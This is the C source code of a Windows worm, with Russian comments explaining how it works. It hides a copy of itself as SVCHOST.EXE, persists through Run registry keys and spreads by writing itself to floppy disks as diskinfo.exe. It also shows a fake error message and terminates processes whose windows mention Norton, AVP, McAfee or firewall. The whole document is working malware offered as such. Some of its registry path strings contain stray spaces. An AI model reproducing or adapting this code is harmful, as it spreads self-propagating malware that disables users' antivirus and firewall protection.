//Выводит липовое сообщение об ошибке. После перезагрузки висит в памяти, и каждые 30000 миллисекунд записывается на дискету под 
//именем diskinfo.exe. Имя файлы svchost.exe маскирут его. Процесс svchost.exe никогда не запускается из-под пользователя (приоритет 
//запуска от системы). Файл, искал все активные окна в заголовках которых содержалось:"Norton","AVP","Anti","Vir","McAfee","anti",
//"vir","firewall". И закрывал их.

char* bad_windows_list[kx] = {"Norton", "AVP","Anti","Vir"," McAfee","anti","vir", "firewall"};

BOOL BadWindow(LPSTR strWindow) {
  BOOL res = FALSE;
  for (int i=0;i<kx;i++)
  if (strstr(strWindow,bad_windows_list[i])!=0) res = TRUE;
  return res;
}

BOOL CALLBACK WndEnumProcMine (HWND hwnd1,long l1) {
  LPTSTR str1 = new char[255];
  GetWindowText(hwnd1,str1,255);
  if (BadWindow(str1)) {
    DWORD dwProcessId;
    GetWindowThreadProcessId(hwnd1,&dwProcessId);
    if (dwProcessId!=GetCurrentProcessId()) {
      HANDLE hProcess = OpenProcess (PROCESS_ALL_ACCESS,FALSE, dwProcessId);
      TerminateProcess(hProcess,0);
      CloseHandle(hProcess);
    }
  }
  delete str1;
  return TRUE;
}

void EnumProcessesOther() {
  LPARAM c = 0;
  EnumWindows((WNDENUMPROC) WndEnumProcMine,c);
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,LPSTR pCmdLine,int nCmdShow) {
  char myname[1024],windir[1024];
  HKEY hKey;
  SetErrorMode(SEM_NOGPFAULTERRORBOX);
  PeekMessage(NULL, NULL, NULL, NULL, NULL);

  GetModuleFileName(hInstance,myname,sizeof (myname));
  GetWindowsDirectory(windir,sizeof(windir));

  strcat(windir,"\\SVCHOST.EXE");
  CopyFile(myname,windir,FALSE);
  SetFileAttributes(windir,FILE_ATTRIBUTE_HIDDEN);

  //--------------------Startup--------------------------------
  RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\ Windows\\CurrentVersion\\ Policies\\Explorer\\Run" ,0,KEY_WRITE,&hKey);
  RegSetValueEx(hKey,"SVCHOST.EXE",0, REG_SZ,(BYTE *)windir,256);
  RegCloseKey(hKey);
  //-----------------------------------------------------------

  if(strcmp(windir,myname)) {
    MessageBox(0, "This program not win32 mode","Error", MB_OK | MB_DEFBUTTON1 | MB_ICONEXCLAMATION | MB_DEFAULT_DESKTOP_ONLY);
    return 0;
  }
//-------
  for(;;) {
    if(IsDiskInDrive ("a:\\")) {
      CopyFile(windir,"a:\\diskinfo.exe",FALSE);
      RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows \\CurrentVersion\\Policies\\Explorer\\Run" ,0,KEY_WRITE,&hKey);
      RegSetValueEx(hKey,"SVCHOST.EXE",0,REG_SZ,(BYTE *)windir,256);
      RegCloseKey(hKey);
    }
    EnumProcessesOther();
    Sleep(30000);
  }
  return 0;
} 
